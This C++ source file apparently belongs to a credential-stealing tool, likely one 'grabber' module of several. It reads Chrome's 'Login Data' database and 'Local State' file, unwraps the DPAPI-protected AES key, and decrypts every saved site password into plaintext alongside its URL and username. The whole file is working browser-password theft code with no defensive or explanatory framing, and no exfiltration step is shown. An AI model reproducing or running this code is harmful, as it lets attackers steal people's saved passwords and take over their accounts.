#include "ChromeCredentialsGrabber.hpp"

#include "Exception.hpp"
#include "Json.hpp"
#include "Crypto/Aes.hpp"
#include "Crypto/Base64.hpp"
#include "Crypto/Protection.hpp"
#include "Filesystem/File.hpp"
#include "Sql/InMemorySqliteDatabase.hpp"
#include "Sql/SqliteRowIterator.hpp"
#include "Utils/Buffer.hpp"
#include "Utils/Environment.hpp"
#include "Utils/Strings.hpp"

#include <filesystem>

static Buffer parse_key(const std::string& encrypted_key)
{
	const Buffer key_with_prefix = Base64::decode(encrypted_key);
	static constexpr std::string_view PREFIX = "DPAPI";

	const Buffer protected_key = {key_with_prefix.begin() + PREFIX.size(), key_with_prefix.end()};
	return Crypto::unprotect_data(protected_key);
}

static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
{
	static constexpr std::string_view PREFIX = "v10";
	static constexpr size_t GCM_IV_LENGTH = 12;

	if (password.size() < PREFIX.size() + GCM_IV_LENGTH)
	{
		throw Exception(ErrorCode::INVALID_ARGUMENT);
	}

	const Buffer iv = {password.begin() + PREFIX.size(), password.begin() + PREFIX.size() + GCM_IV_LENGTH};
	const Buffer encrypted_password = {
		password.begin() + PREFIX.size() + GCM_IV_LENGTH,
		password.end()
	};

	return {iv, encrypted_password};
}

std::optional<Credentials> ChromeCredentialsGrabber::grab_credentials() const
{
	const std::filesystem::path chrome_root_folder = Environment::expand_variables(CHROME_ROOT_FOLDER);
	const std::filesystem::path user_data_folder = chrome_root_folder / "User Data";
	const std::filesystem::path login_data_db_path = user_data_folder / L"Login Data";
	const std::filesystem::path local_state_path = user_data_folder / "Local State";

	const InMemorySqliteDatabase login_data_db(
		File(login_data_db_path, File::Mode::READ, File::Disposition::OPEN).read()
	);
	const Json local_state = Json::parse(File(local_state_path, File::Mode::READ, File::Disposition::OPEN).read());

	const auto aes_key = parse_key(local_state["os_crypt"]["encrypted_key"].get<std::string>());

	Credentials credentials;

	for (SqliteRowIterator iterator = login_data_db.iterate_query(
		     "SELECT origin_url, username_value, password_value FROM logins"
	     );
	     iterator.next();)
	{
		const SqliteRow row = iterator.current();
		const auto [origin_url, username_value, password_value] = as_tuple<std::wstring, std::wstring, Buffer>(
			row
		);

		if (password_value.empty())
		{
			continue;
		}

		auto [iv, encrypted_password] = parse_password(password_value);

		const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);

		credentials.emplace_back(
			origin_url,
			username_value,
			Strings::to_wstring(Strings::to_string(plaintext_password))
		);
	}

	return credentials;
}

std::wstring ChromeCredentialsGrabber::source() const
{
	return L"Chrome";
}
